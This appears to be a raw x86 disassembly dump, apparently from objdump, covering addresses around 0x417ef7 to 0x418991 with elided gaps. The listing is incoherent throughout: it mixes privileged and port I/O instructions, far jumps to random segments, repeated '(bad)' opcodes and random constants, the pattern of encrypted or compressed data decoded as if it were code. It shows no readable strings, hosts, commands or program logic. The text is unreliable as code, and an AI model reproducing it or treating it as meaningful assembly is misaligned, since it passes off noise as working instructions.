  417ef7:	mov    ds,WORD PTR [ecx]
  417ef9:	stc    
  417efa:	aas    
  417efb:	shl    DWORD PTR [ebx+0x4307e9c1],0x4a
  417f02:	jns    0x417e94
  417f04:	or     BYTE PTR [ecx-0x7f0374bf],dh
  417f0a:	jge    0x417ec2
  417f0c:	fadd   st(5),st
  417f0e:	mov    ds:0xd70fdaf6,al
  417f13:	sbb    cl,BYTE PTR [edi]
  417f15:	sar    BYTE PTR [edx],0xfd
  417f18:	popa   
  417f19:	mov    ebp,0x973d3699
  417f1e:	jae    0x417f08
  417f20:	jge    0x417f59
  417f22:	pop    ebx
  417f23:	mov    eax,0x3c499a2b
  417f28:	mov    edi,ebx
  417f2a:	or     DWORD PTR [ebp+0x46190198],edi
  417f30:	push   es
  417f31:	inc    ebx
  417f32:	or     ebx,edx
  417f34:	pushf  
  417f35:	shl    DWORD PTR [eax-0x5e425b0d],cl
  417f3b:	jle    0x417f2a
  417f3d:	xchg   edx,eax
  417f3e:	and    al,0xfb
  417f40:	mov    bl,BYTE PTR [edx]
  417f42:	test   eax,0x4892108
  417f47:	pop    ss
  417f48:	mov    eax,ds:0x1611fca4
  417f4d:	jmp    0x417f30
  417f4f:	dec    ebx
  417f50:	hlt    
  417f51:	out    dx,al
  417f52:	pop    es
  417f53:	sbb    esp,DWORD PTR [esi+0x4]
  417f56:	or     al,0x68
  417f58:	add    eax,0x9909f8e0
  417f5d:	mov    WORD PTR [ebp+0x5b],cs
  417f60:	xadd   BYTE PTR [edi+0x77185c05],ch
  417f67:	imul   eax,DWORD PTR fs:[ecx-0x4c],0xffffffc5
  417f6c:	into   
  417f6d:	add    DWORD PTR [eax],eax
	...
  417fd3:	add    BYTE PTR [eax],al
  417fd5:	add    BYTE PTR [edx-0x1a],ah
  417fd8:	out    0x3b,al
  417fda:	out    0x3b,al
  417fdc:	(bad)  
  417fdd:	push   DWORD PTR [edx]
  417fdf:	xchg   edx,eax
  417fe0:	xor    al,bh
  417fe2:	cwde   
  417fe3:	lea    ebp,ds:0x10267fc
  417fe9:	add    BYTE PTR [eax],al
  417feb:	add    DWORD PTR [eax],eax
  417fed:	add    BYTE PTR [eax+ebx*4+0x28c8d382],al
  417ff4:	mov    ch,0x6c
  417ff6:	mov    ds:0x447dd56e,al
  417ffc:	sbb    ch,BYTE PTR [ebx]
  417ffe:	ins    DWORD PTR es:[edi],dx
  417fff:	cmp    dl,BYTE PTR [ebp+0x3d2bcef6]
  418005:	dec    esp
  418006:	ror    DWORD PTR ds:0x62d83e19,1
  41800c:	push   edx
  41800d:	aas    
  41800e:	mov    bl,al
  418010:	jmp    DWORD PTR [eax-0x6feb6eb3]
  418016:	cpuid  
  418018:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418019:	pop    esp
  41801a:	pop    edx
  41801b:	dec    ebp
  41801c:	outs   dx,DWORD PTR ds:[esi]
  41801d:	xchg   ebp,eax
  41801e:	call   0x7212:0x90bebef9
  418025:	xor    eax,0xac414b3f
  41802a:	inc    edx
  41802b:	int    0x5e
  41802d:	sbb    bh,BYTE PTR [edx+edx*4]
  418030:	push   0xd07d62ac
  418035:	icebp  
  418036:	arpl   WORD PTR [edi-0x75],ax
  418039:	or     ah,BYTE PTR [ebp-0x4f3c081b]
  41803f:	mov    WORD PTR [edx-0x763888c5],fs
  418045:	push   ebp
  418046:	sub    eax,0x704fbf52
  41804b:	fsincos 
  41804d:	mov    esi,0xcaa8a9b0
  418052:	xor    al,0x96
  418054:	mov    al,ds:0x9ee84b4e
  418059:	loope  0x417fe6
  41805b:	push   esi
  41805c:	pop    ebp
  41805d:	pop    ebx
  41805e:	mov    eax,ds:0x74820f62
  418063:	fcmovne st,st(1)
  418065:	or     al,0xe8
  418067:	bswap  edx
  418069:	adc    DWORD PTR [ebx],esi
  41806b:	ja     0x4180db
  41806d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41806e:	ins    DWORD PTR es:[edi],dx
  41806f:	fcom   st(3)
  418071:	bound  edi,QWORD PTR [ebp+0x8]
  418074:	sbb    al,0x7b
  418076:	fst    QWORD PTR [esi]
  418078:	fs mov bl,0x1d
  41807b:	adc    al,BYTE PTR [edx]
  41807d:	mov    WORD PTR [edi],ss
  41807f:	inc    edx
  418080:	sbb    eax,0x92a507e2
  418085:	adc    eax,0x2166b9fb
  41808a:	out    dx,al
  41808b:	call   0x8c90d3fb
  418090:	sub    DWORD PTR [ecx+0x57990f4d],esp
  418096:	pop    ds
  418097:	int3   
  418098:	mov    al,0xf2
  41809a:	adc    al,0x4e
  41809c:	cmc    
  41809d:	jg     0x418049
  41809f:	or     bh,bl
  4180a1:	jnp    0x4180aa
  4180a3:	sub    BYTE PTR [ecx-0x1b],dl
  4180a6:	mov    bh,0x7e
  4180a8:	(bad)  
  4180a9:	aas    
  4180aa:	xor    bl,al
  4180ac:	jp     0x4180aa
  4180ae:	mov    esi,0x6b4b5ad0
  4180b3:	fadd   QWORD PTR [esi-0xb]
  4180b6:	js     0x41806d
  4180b8:	dec    DWORD PTR [eax-0x2ee727cf]
  4180be:	add    al,BYTE PTR [esi+0x61]
  4180c1:	test   DWORD PTR [ebx-0xa],ebx
  4180c4:	sub    ah,BYTE PTR [esi+0x1e]
  4180c7:	pop    edx
  4180c8:	inc    ecx
  4180c9:	mov    DWORD PTR [eax+0x25],eax
  4180cc:	or     eax,0x9c68ea79
  4180d1:	mov    ?,WORD PTR [edi-0x35f1674c]
  4180d7:	daa    
  4180d8:	inc    ebx
  4180d9:	dec    ebx
  4180da:	mov    bh,BYTE PTR [ebx-0x60f6c245]
  4180e0:	xor    edx,DWORD PTR [ecx-0x6fdc3e9d]
  4180e6:	dec    esp
  4180e7:	add    dl,BYTE PTR [ebx+ebp*2]
  4180ea:	mov    dh,0x9b
  4180ec:	out    0xd1,eax
	...
  418156:	test   eax,0xff456b7e
  41815b:	push   ebp
  41815c:	scas   eax,DWORD PTR es:[edi]
  41815d:	(bad)  
  41815e:	mov    ds:0x802fdebc,eax
  418163:	into   
  418164:	jmp    0x41819d
  418166:	add    eax,DWORD PTR [bx+di]
  418169:	add    BYTE PTR [eax],al
  41816b:	add    DWORD PTR [eax],eax
  41816d:	add    ch,dh
  41816f:	loope  0x418109
  418171:	inc    ebx
  418172:	mov    edi,0x2226a785
  418177:	cdq    
  418178:	std    
  418179:	adc    BYTE PTR [esi+0x2bffe841],dl
  41817f:	push   eax
  418180:	mov    bh,0x3
  418182:	out    0xc8,eax
  418184:	ds div edi
  418187:	sbb    BYTE PTR ss:[ecx+0x45aea5c5],0xf5
  41818f:	jecxz  0x418124
  418191:	enter  0x878d,0xdb
  418195:	sub    BYTE PTR [ebx],0xb5
  418198:	jle    0x418181
  41819a:	add    esp,DWORD PTR [ebx+0x72352122]
  4181a0:	or     al,0xf3
  4181a2:	fstp   QWORD PTR [edx]
  4181a4:	mov    ds:0x8cb1f0f,eax
  4181a9:	pushf  
  4181aa:	push   0xfbf7eb8c
  4181af:	adc    BYTE PTR [edi],bh
  4181b1:	mov    eax,DWORD PTR [edx+0x12]
  4181b4:	fst    QWORD PTR [ebx]
  4181b6:	pushf  
  4181b7:	out    0xb,eax
  4181b9:	(bad)  
  4181ba:	pop    ebp
  4181bb:	mov    bh,0x65
  4181bd:	ja     0x4181a7
  4181bf:	ds jl  0x4181ec
  4181c2:	mov    edi,0x6b891600
  4181c7:	pop    esi
  4181c8:	jp     0x418208
  4181ca:	cmc    
  4181cb:	dec    edi
  4181cc:	xchg   ebx,eax
  4181cd:	pop    ss
  4181ce:	dec    BYTE PTR [edi-0x66ce35b2]
  4181d4:	adc    al,0xc
  4181d6:	test   al,0x27
  4181d8:	and    eax,0x51ed264e
  4181dd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4181de:	pop    ds
  4181df:	shl    DWORD PTR [esi],0x12
  4181e2:	in     al,0x74
  4181e4:	nop
  4181e5:	adc    BYTE PTR [ecx],0xba
  4181e8:	or     BYTE PTR [ecx],0xb2
  4181eb:	(bad)  
  4181ec:	mov    bh,0x7e
  4181ee:	inc    esi
  4181ef:	mov    ebp,0x2f901532
  4181f4:	mov    bl,0x4
  4181f6:	loop   0x41824b
  4181f8:	mov    ch,0x20
  4181fa:	stc    
  4181fb:	add    edi,DWORD PTR [ebp-0x68]
  4181fe:	add    BYTE PTR [edx-0x1b89c95b],bh
  418204:	mov    bl,0x2e
  418206:	xor    eax,0x45765953
  41820b:	gs cwde 
  41820d:	adc    eax,0xc236c41d
  418212:	stc    
  418213:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418214:	jnp    0x418240
  418216:	aam    0x2b
  418218:	adc    BYTE PTR [edx+edi*4],cl
  41821b:	sbb    DWORD PTR [ebx-0x1b4323ee],esp
  418221:	(bad)  
  418222:	not    DWORD PTR [edx+0x16ab1374]
  418228:	xlat   BYTE PTR ds:[ebx]
  418229:	mov    bh,0xda
  41822b:	mov    al,0x9e
  41822d:	inc    ebx
  41822e:	cmp    cl,ah
  418230:	xor    bh,BYTE PTR [edi+0xc]
  418233:	outs   dx,BYTE PTR ds:[esi]
  418234:	(bad)  
  418235:	leave  
  418236:	jle    0x4182b2
  418238:	cmp    al,0x6c
  41823a:	or     al,0x23
  41823c:	sbb    cl,BYTE PTR [ecx]
  41823e:	in     eax,0xb0
  418240:	and    BYTE PTR [edx+0x5e3f62cb],bh
  418246:	out    dx,al
  418247:	aam    0x10
  418249:	arpl   cx,ax
  41824b:	neg    DWORD PTR [edx+0x4f323327]
  418251:	pop    edi
  418252:	inc    esp
  418253:	std    
  418254:	dec    edi
  418255:	mov    edx,0x135ea7f9
  41825a:	xchg   edi,eax
  41825b:	mov    eax,0x99a4aedd
  418260:	jo     0x4181f3
  418262:	mov    BYTE PTR [esi+esi*2],bl
  418265:	not    BYTE PTR ss:0xad689c2d
  41826c:	jecxz  0x418280
	...
  4182d6:	aaa    
  4182d7:	xchg   edx,eax
  4182d8:	and    al,0x83
  4182da:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4182db:	mov    bh,0xb7
  4182dd:	mov    dh,0x40
  4182df:	mov    ebx,0xa549b8d6
  4182e4:	(bad)  
  4182e5:	out    dx,al
  4182e6:	addr16 add al,0x1
  4182e9:	add    BYTE PTR [eax],al
  4182eb:	add    DWORD PTR [eax],eax
  4182ed:	add    BYTE PTR [esi],bh
  4182ef:	xchg   DWORD PTR [ecx-0x1c],ecx
  4182f2:	xlat   BYTE PTR ds:[ebx]
  4182f3:	inc    ecx
  4182f4:	ret    
  4182f5:	outs   dx,DWORD PTR ds:[esi]
  4182f6:	dec    eax
  4182f7:	and    esp,edi
  4182f9:	fnstenv [edi-0x3c9e127e]
  4182ff:	jmp    0x44dd:0x14613601
  418306:	mov    dl,ch
  418308:	in     eax,dx
  418309:	pop    edx
  41830a:	bound  eax,QWORD PTR [ecx-0x5b2fbeeb]
  418310:	lea    esi,[ecx+0x6b7b8e4c]
  418316:	pop    esp
  418317:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418318:	popa   
  418319:	cmp    dl,BYTE PTR [eax]
  41831b:	test   eax,0x20d2ef59
  418320:	mov    ?,WORD PTR [ebp-0x77]
  418323:	push   ecx
  418324:	hlt    
  418325:	test   eax,0x4906653c
  41832a:	dec    DWORD PTR [ebp+eax*1+0x31]
  41832e:	(bad)
  418332:	xor    ebp,ebx
  418334:	xchg   ecx,eax
  418335:	cmp    edi,DWORD PTR ds:0x5954dc45
  41833b:	pop    esp
  41833c:	fistp  DWORD PTR [edx+eax*8]
  41833f:	and    al,0x54
  418341:	fiadd  WORD PTR [eax+0x48]
  418344:	pop    es
  418345:	push   ebx
  418346:	mov    edx,0xdb810fe0
  41834b:	adc    al,0x4
  41834d:	jae    0x4183c9
  41834f:	adc    DWORD PTR [edi],eax
  418351:	jmp    0x3273:0x4643e7fc
  418358:	pop    es
  418359:	popa   
  41835a:	test   al,0x28
  41835c:	push   0xe9f5d161
  418361:	or     edi,eax
  418363:	pushf  
  418364:	shl    BYTE PTR [ebp+0x4aeab63b],0xdb
  41836b:	std    
  41836c:	fcom   QWORD PTR [ecx-0x46]
  418370:	scas   eax,DWORD PTR es:[edi]
  418371:	push   esp
  418372:	push   ecx
  418373:	jle    0x418394
  418375:	idiv   BYTE PTR [edi-0x35d533b4]
  41837b:	enter  0x3861,0x34
  41837f:	jo     0x418388
  418381:	xchg   edx,eax
  418382:	(bad)  [eax]
  418384:	je     0x418372
  418386:	es iret 
  418388:	pushf  
  418389:	mov    eax,ds:0x1b201e70
  41838e:	out    dx,eax
  41838f:	cli    
  418390:	mov    dh,0x30
  418392:	lea    eax,[edi+0x36]
  418395:	test   eax,0x27c3269f
  41839a:	xor    DWORD PTR [edi],ebx
  41839c:	mov    edi,0x98353394
  4183a1:	pop    ss
  4183a2:	ins    BYTE PTR es:[edi],dx
  4183a3:	jo     0x4183ea
  4183a5:	fbld   TBYTE PTR [ebx-0x7f]
  4183a8:	sbb    eax,0x2bd61f68
  4183ad:	enter  0x1041,0x4b
  4183b1:	bound  ebp,QWORD PTR [eax-0x1c2227c2]
  4183b7:	add    ecx,DWORD PTR [edx-0x16]
  4183ba:	je     0x4183f7
  4183bc:	dec    ebx
  4183bd:	or     DWORD PTR ds:0x6a8ca136,ebp
  4183c3:	add    al,0x0
  4183c5:	or     eax,0x7f84dc2c
  4183ca:	mov    WORD PTR [edx],es
  4183cc:	rol    DWORD PTR [edi],0x46
  4183cf:	loop   0x4183f6
  4183d1:	ror    cl,cl
  4183d3:	mov    ebx,0x9197d445
  4183d8:	xor    cl,0x13
  4183db:	in     al,0xea
  4183dd:	fmul   QWORD PTR [eax-0xe]
  4183e0:	mov    bl,BYTE PTR [eax+edi*1]
  4183e3:	ret    0x1942
  4183e6:	rcl    DWORD PTR [ebx+0x163349d7],0xba
  4183ed:	sbb    eax,DWORD PTR [eax]
	...
  418453:	add    BYTE PTR [eax],al
  418455:	add    ah,bl
  418457:	mov    bl,0x3f
  418459:	push   eax
  41845a:	jg     0x418438
  41845c:	(bad)  
  41845d:	mov    edi,0x14d871ac
  418462:	xor    al,0x5e
  418464:	ins    BYTE PTR es:[edi],dx
  418465:	mov    eax,0x10567
  41846a:	add    BYTE PTR [ecx],al
  41846c:	add    BYTE PTR [eax],al
  41846e:	rcr    ecx,0x38
  418471:	mov    al,0x12
  418473:	and    eax,0x1bfc9254
  418478:	adc    DWORD PTR [ecx-0x28611374],eax
  41847e:	inc    esi
  41847f:	int    0xea
  418481:	lea    eax,[ebx]
  418483:	inc    ecx
  418484:	inc    ebp
  418485:	push   DWORD PTR [esi+ecx*8]
  418488:	cmp    esi,ebp
  41848a:	ss xchg esi,eax
  41848c:	xchg   edx,eax
  41848d:	mov    BYTE PTR [esi+0x6b],dl
  418490:	cwde   
  418491:	test   eax,0x849ecedf
  418496:	in     eax,dx
  418497:	xabort 0xf5
  41849a:	jmp    0x418431
  41849c:	push   ss
  41849d:	xor    ebx,DWORD PTR [ebx+0x43d5beb6]
  4184a3:	(bad)  
  4184a4:	xchg   esi,eax
  4184a5:	test   al,0xef
  4184a7:	adc    DWORD PTR [edx+ebx*4+0x1a],ecx
  4184ab:	pop    esi
  4184ac:	mov    al,0x21
  4184ae:	aas    
  4184af:	mov    cl,0xe
  4184b1:	mov    ds:0xdbcdb6e9,eax
  4184b6:	dec    eax
  4184b7:	std    
  4184b8:	jo     0x4184c3
  4184ba:	nop
  4184bb:	std    
  4184bc:	or     esi,DWORD PTR [ecx]
  4184be:	cwde   
  4184bf:	xchg   esp,eax
  4184c0:	or     eax,0xf52fff32
  4184c5:	and    BYTE PTR [ecx+0x4079bebb],cl
  4184cb:	cmp    ecx,DWORD PTR [ecx]
  4184cd:	jbe    0x41847c
  4184cf:	iret   
  4184d0:	xor    ebx,DWORD PTR [esi-0x16fa152c]
  4184d6:	sbb    DWORD PTR ds:[eax+0x49d6897c],eax
  4184dd:	jge    0x4184be
  4184df:	fdivr  QWORD PTR [ebp+0x5f]
  4184e2:	or     BYTE PTR [ebx+0x7ca5ba1e],0x1f
  4184e9:	(bad)  
  4184ea:	sti    
  4184eb:	call   0x9f24:0x7d4337fc
  4184f2:	inc    ebx
  4184f4:	rol    DWORD PTR [ebp+0x3a],1
  4184f7:	inc    edi
  4184f8:	test   BYTE PTR [eax-0x8],ch
  4184fb:	icebp  
  4184fc:	adc    al,0x2
  4184fe:	into   
  4184ff:	leave  
  418500:	arpl   WORD PTR [ebx],bp
  418502:	dec    eax
  418503:	cmp    ebp,edi
  418505:	xor    BYTE PTR [edi-0x57],cl
  418508:	jmp    0x418575
  41850a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41850b:	shl    dl,cl
  41850d:	inc    esi
  41850e:	dec    ebp
  41850f:	neg    DWORD PTR [esi-0x1aa00b4d]
  418515:	jo     0x41849b
  418517:	in     eax,0x87
  418519:	xchg   BYTE PTR [ebp+0x2f01ec2f],bh
  41851f:	enter  0x64dc,0x6c
  418523:	ficomp WORD PTR [ebx-0x131de744]
  418529:	jg     0x418536
  41852b:	sub    BYTE PTR [eax+0x4c],ch
  41852e:	or     eax,DWORD PTR [esi+edx*4+0x1e]
  418532:	pop    ebp
  418533:	jmp    0xb22d:0x5c37d7be
  41853a:	sub    esi,0x18
  41853d:	dec    eax
  41853e:	add    BYTE PTR [edi+0x61],dh
  418541:	mov    esi,DWORD PTR [edi]
  418543:	daa    
  418544:	sbb    BYTE PTR [eax+0xf316d9a],bl
  41854a:	mov    al,0xc5
  41854c:	sti    
  41854d:	sbb    dh,cl
  41854f:	and    al,0x30
  418551:	jo     0x41857c
  418553:	ins    BYTE PTR es:[edi],dx
  418554:	stos   BYTE PTR es:[edi],al
  418555:	cdq    
  418556:	pop    ds
  418557:	sbb    al,0xa4
  418559:	push   ds
  41855a:	fisttp QWORD PTR [ebp-0x2892dc1b]
  418560:	arpl   di,ax
  418562:	or     ebx,eax
  418564:	aad    0xf2
  418566:	sbb    dh,ch
  418568:	jecxz  0x41851b
  41856a:	pop    ebp
  41856b:	ins    BYTE PTR es:[edi],dx
  41856c:	imul   ebp,esp,0x0
	...
  4185d6:	inc    ecx
  4185d7:	stc    
  4185d8:	mov    ebx,ebx
  4185da:	mov    ebx,0x26fb51fb
  4185df:	lods   al,BYTE PTR ds:[esi]
  4185e0:	imul   dl
  4185e2:	xchg   esp,ecx
  4185e4:	adc    al,0x2b
  4185e6:	addr16 push es
  4185e8:	add    DWORD PTR [eax],eax
  4185ea:	add    BYTE PTR [ecx],al
  4185ec:	add    BYTE PTR [eax],al
  4185ee:	stc    
  4185ef:	mov    esp,0x80a06f21
  4185f4:	retf   0xdfc
  4185f7:	dec    ebx
  4185f8:	aam    0xe4
  4185fa:	and    eax,0x62297c28
  4185ff:	cld    
  418600:	pop    esp
  418601:	repz mov bl,0xe8
  418604:	in     al,0xf1
  418606:	dec    eax
  418607:	lea    ebx,[ebx]
  418609:	mov    dh,0xbf
  41860b:	xchg   ebx,eax
  41860c:	leave  
  41860d:	nop
  41860e:	shld   edx,esi,0x4
  418612:	fbstp  TBYTE PTR [ebp+0x467972b8]
  418618:	cmp    al,0xc0
  41861a:	ss (bad) 
  41861c:	cmp    DWORD PTR [eax],edx
  41861e:	mov    eax,0xa8912038
  418623:	mov    al,ds:0xf58f86be
  418628:	enter  0x2258,0x22
  41862c:	loopne 0x4186a2
  41862e:	in     al,dx
  41862f:	outs   dx,BYTE PTR ds:[esi]
  418630:	mov    bl,0xe6
  418632:	fs jnp 0x41860a
  418635:	lods   al,BYTE PTR ds:[esi]
  418636:	mov    eax,ds:0x29e551ec
  41863b:	retf   0x3601
  41863e:	add    ebx,DWORD PTR [ebp+esi*2+0x766a4af8]
  418645:	inc    edi
  418646:	and    al,BYTE PTR [ebp+0x79]
  418649:	pusha  
  41864a:	pop    edx
  41864b:	mov    ecx,0xa58436ee
  418650:	mov    ebx,0xc5710e85
  418655:	sub    al,bh
  418657:	hlt    
  418658:	add    DWORD PTR [ebx+eax*1-0x2],edx
  41865c:	mov    ah,0x30
  41865e:	ror    BYTE PTR [edi-0x6f],cl
  418661:	pop    ebx
  418662:	mul    BYTE PTR [esi+0x2b7b50f7]
  418668:	inc    ecx
  418669:	scas   al,BYTE PTR es:[edi]
  41866a:	mov    ecx,0x2885cbb
  41866f:	gs jecxz 0x418695
  418672:	mov    ecx,0xb5c32e68
  418677:	xchg   edi,eax
  418678:	push   ecx
  418679:	fild   WORD PTR [ecx+0x1c]
  41867c:	jae    0x4186ee
  41867e:	xlat   BYTE PTR ds:[ebx]
  41867f:	jmp    0x418627
  418681:	les    edx,FWORD PTR [edx]
  418683:	iret   
  418684:	fwait
  418685:	rcr    BYTE PTR [ecx-0x36325c1],cl
  41868b:	outs   dx,DWORD PTR ds:[esi]
  41868c:	fild   WORD PTR [esi]
  41868e:	cmc    
  41868f:	dec    ecx
  418690:	out    0xb3,eax
  418692:	ins    BYTE PTR es:[edi],dx
  418693:	lock aad 0xcb
  418696:	das    
  418697:	inc    esi
  418698:	pop    ebp
  418699:	xchg   ebp,eax
  41869a:	stos   DWORD PTR es:[edi],eax
  41869b:	sbb    edx,DWORD PTR [ebx-0x37]
  41869e:	stos   BYTE PTR es:[edi],al
  41869f:	xchg   esi,eax
  4186a0:	sub    bl,0xbd
  4186a3:	neg    DWORD PTR [esi+ebp*8]
  4186a6:	sbb    eax,DWORD PTR [edx-0x5e]
  4186a9:	aad    0x4e
  4186ab:	add    BYTE PTR [eax],0x16
  4186ae:	std    
  4186af:	test   DWORD PTR [edi-0x4ec352a4],esp
  4186b5:	outs   dx,BYTE PTR ds:[esi]
  4186b6:	add    al,0xb2
  4186b8:	sbb    eax,ebp
  4186ba:	outs   dx,BYTE PTR ds:[esi]
  4186bb:	sahf   
  4186bc:	ror    BYTE PTR [ebx+eax*4],1
  4186bf:	rcr    DWORD PTR [edx+0x43],cl
  4186c2:	sub    BYTE PTR [eax+0xb],bh
  4186c5:	jge    0x4186fe
  4186c7:	dec    edi
  4186c8:	or     eax,0x66a1af3f
  4186cd:	adc    al,0xda
  4186cf:	jnp    0x418720
  4186d1:	and    ecx,DWORD PTR [edx]
  4186d3:	bound  edx,QWORD PTR [ebp+eiz*4+0x48515169]
  4186da:	and    DWORD PTR [esi],ebx
  4186dc:	sbb    DWORD PTR [esi],edi
  4186de:	ret    0x1e32
  4186e1:	cmp    esp,ebp
  4186e3:	sub    bh,dl
  4186e5:	outs   dx,BYTE PTR ds:[esi]
  4186e6:	out    dx,al
  4186e7:	sbb    esi,ebp
  4186e9:	ja     0x418678
  4186eb:	sar    edx,0x94
	...
  418756:	xchg   ebx,eax
  418757:	sub    BYTE PTR [eax-0x604344c4],ah
  41875d:	scas   eax,DWORD PTR es:[edi]
  41875e:	or     al,0x8d
  418760:	cmp    edx,edx
  418762:	mov    ebp,esi
  418764:	inc    ecx
  418765:	fisub  DWORD PTR [edi+0x7]
  418768:	add    DWORD PTR [eax],eax
  41876a:	add    BYTE PTR [ecx],al
  41876c:	add    BYTE PTR [eax],al
  41876e:	add    edi,DWORD PTR [ecx-0x67]
  418771:	cmp    esi,DWORD PTR [esi+0x6f]
  418774:	stos   BYTE PTR es:[edi],al
  418775:	icebp  
  418776:	jnp    0x4187cc
  418778:	ret    0xbe9b
  41877b:	ja     0x41877b
  41877d:	pop    eax
  41877e:	leave  
  41877f:	shl    DWORD PTR [ecx-0x14],1
  418782:	retf   0x12ab
  418785:	bound  esp,QWORD PTR [ebx+0xaeee1f4]
  41878b:	dec    ebp
  41878c:	sbb    ebx,DWORD PTR [edx-0x64035344]
  418792:	sub    BYTE PTR [ecx+eax*1+0x30a94f4f],0x79
  41879a:	fsubr  DWORD PTR [eax+0x4870dc1d]
  4187a0:	jp     0x418766
  4187a2:	fucomp st(5)
  4187a4:	repz inc ecx
  4187a6:	push   eax
  4187a7:	ret    
  4187a8:	xor    DWORD PTR [ebp-0x6898d4f4],esi
  4187ae:	cli    
  4187af:	xlat   BYTE PTR ds:[ebx]
  4187b0:	les    ebp,FWORD PTR [esi+eiz*8-0x7e]
  4187b4:	fist   WORD PTR [esi-0x5e3da246]
  4187ba:	aad    0x8d
  4187bc:	retf   0x143c
  4187bf:	lods   eax,DWORD PTR ds:[esi]
  4187c0:	cld    
  4187c1:	push   edi
  4187c2:	jp     0x418788
  4187c4:	adc    ah,BYTE PTR [edi-0x71]
  4187c7:	int    0x80
  4187c9:	scas   eax,DWORD PTR es:[edi]
  4187ca:	imul   edi,ebp,0xffffffc5
  4187cd:	retf   
  4187ce:	and    ah,BYTE PTR [eax]
  4187d0:	cwde   
  4187d1:	push   eax
  4187d2:	fwait
  4187d3:	(bad)
  4187d6:	aam    0x57
  4187d8:	adc    al,0x38
  4187da:	push   0x6ea91c93
  4187df:	enter  0xc8c4,0x4
  4187e3:	xchg   BYTE PTR [eax+0x592754f4],dh
  4187e9:	call   0x4a020e5a
  4187ee:	ds stc 
  4187f0:	xchg   esi,eax
  4187f1:	sub    esi,DWORD PTR [eax-0x746de936]
  4187f7:	loope  0x418845
  4187f9:	cld    
  4187fa:	dec    ecx
  4187fb:	shl    DWORD PTR [ebx-0x73],cl
  4187fe:	(bad)  
  418800:	dec    ebp
  418801:	mov    DWORD PTR [ebp-0x56ee6d67],ecx
  418807:	sbb    ebx,DWORD PTR [esi*8-0x369bb27b]
  41880e:	jge    0x41881b
  418810:	out    dx,eax
  418811:	jns    0x4187db
  418813:	(bad)  
  418814:	mov    ebp,0xf3f1348c
  418819:	aas    
  41881a:	inc    esi
  41881b:	loope  0x4187ac
  41881d:	test   al,0x41
  41881f:	xchg   esi,eax
  418820:	(bad)  
  418822:	test   al,0x8b
  418824:	out    0x13,eax
  418826:	pop    edi
  418827:	inc    ebx
  418828:	xor    eax,DWORD PTR [esi]
  41882a:	scas   eax,DWORD PTR es:[edi]
  41882b:	or     DWORD PTR [ebx],edx
  41882d:	pop    ebx
  41882e:	push   edx
  41882f:	mov    edx,0x5abcb1ab
  418834:	jg     0x41886f
  418836:	xor    ecx,esp
  418838:	or     al,0xec
  41883a:	cmp    ch,BYTE PTR [eax-0x74120d1a]
  418840:	cmp    eax,DWORD PTR [edx+ecx*2]
  418843:	sbb    al,0x65
  418845:	cld    
  418846:	mov    ds:0x5ce601b1,eax
  41884b:	out    dx,eax
  41884c:	mov    es,esi
  41884e:	dec    ebx
  41884f:	or     bl,BYTE PTR [eax]
  418851:	ja     0x418827
  418853:	test   ebp,esi
  418855:	into   
  418856:	cs xchg ecx,eax
  418858:	jmp    0xa943367b
  41885d:	pop    esi
  41885e:	(bad)  [edi+0x66]
  418861:	cmp    eax,0x5bf9b9b6
  418866:	daa    
  418867:	retf   0xc796
  41886a:	rcr    DWORD PTR ds:0xb497,cl
	...
  4188d4:	add    BYTE PTR [eax],al
  4188d6:	xchg   esp,eax
  4188d7:	enter  0x4337,0x7f
  4188db:	push   esp
  4188dd:	fbld   TBYTE PTR [esi+0x1e9c3acd]
  4188e3:	add    ecx,DWORD PTR [ecx]
  4188e5:	shl    BYTE PTR [edi+0x8],0x1
  4188e9:	add    BYTE PTR [eax],al
  4188eb:	add    DWORD PTR [eax],eax
  4188ed:	add    BYTE PTR [edi+0x4e8cc7e9],bh
  4188f3:	mov    esp,0x5a03deb7
  4188f8:	add    BYTE PTR [ebx+0x3d],ch
  4188fb:	nop
  4188fc:	or     ebp,esi
  4188fe:	add    DWORD PTR [edx-0x21],0x59b8441
  418905:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418906:	jle    0x4188f3
  418908:	retf   0x3c10
  41890b:	pop    ebp
  41890c:	cmp    BYTE PTR [ecx],dl
  41890e:	mov    WORD PTR [ebp+0x5a],?
  418911:	lock sti 
  418913:	mov    dh,0x1d
  418915:	xor    al,0x64
  418917:	cmp    ecx,DWORD PTR ds:0x16e51bdd
  41891d:	push   ds
  41891e:	xor    dh,BYTE PTR [esi-0x267afed9]
  418924:	xor    ch,BYTE PTR [eax+0x24]
  418927:	and    bl,BYTE PTR [ebx+eax*4+0x18]
  41892b:	(bad)  
  41892c:	adc    bh,BYTE PTR ds:0xe258db77
  418932:	rol    esp,1
  418934:	inc    ecx
  418935:	jno    0x418920
  418937:	loop   0x4189b1
  418939:	pushf  
  41893a:	xchg   BYTE PTR [esi-0x4dbbec9c],bl
  418940:	push   ecx
  418941:	jns    0x41895b
  418943:	push   ebx
  418944:	add    al,0xd4
  418946:	inc    ebp
  418947:	sbb    al,0x1c
  418949:	scas   al,BYTE PTR es:[edi]
  41894a:	or     BYTE PTR gs:[edx],cl
  41894d:	lds    eax,FWORD PTR [edx+ecx*8+0x2d]
  418951:	push   ebp
  418952:	push   ebx
  418953:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418954:	push   cs
  418955:	push   eax
  418956:	push   eax
  418957:	mov    bh,0x7
  418959:	xor    bl,BYTE PTR [edi-0x6f17cdac]
  41895f:	(bad)  
  418960:	adc    eax,0x3fa0bdef
  418965:	adc    BYTE PTR [eax],dl
  418967:	scas   al,BYTE PTR es:[edi]
  418968:	push   0x3a
  41896a:	bnd call 0x7fac2899
  418970:	(bad)  
  418972:	int    0x78
  418974:	(bad)  
  418975:	out    dx,eax
  418976:	mov    ah,0x96
  418978:	add    ah,bl
  41897a:	fwait
  41897b:	mov    dh,0x95
  41897d:	cmp    DWORD PTR [edi],eax
  41897f:	data16 jo 0x41893d
  418982:	rol    eax,1
  418984:	cdq    
  418985:	xor    eax,0x39c05797
  41898a:	aaa    
  41898b:	retf   0x19f7
  41898e:	xchg   ecx,eax
  41898f:	test   al,0x25
  418991:	or     DWORD PTR [esi-0x6e],ebp
